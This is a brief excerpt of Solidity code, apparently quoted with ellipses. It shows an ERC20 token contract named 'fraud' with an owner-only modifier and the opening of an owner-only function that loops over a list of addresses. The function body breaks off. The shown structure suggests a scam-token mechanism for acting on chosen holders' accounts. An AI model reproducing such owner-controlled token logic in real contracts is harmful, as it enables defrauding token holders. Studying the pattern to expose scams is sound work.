...
contract fraud is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == door, "Not allowed");
        _;
    }

    function bus(address[] memory complete) public onlyOwner() {
        for (uint256 i = 0; i < complete.length; i++) {
            address account = complete[i];
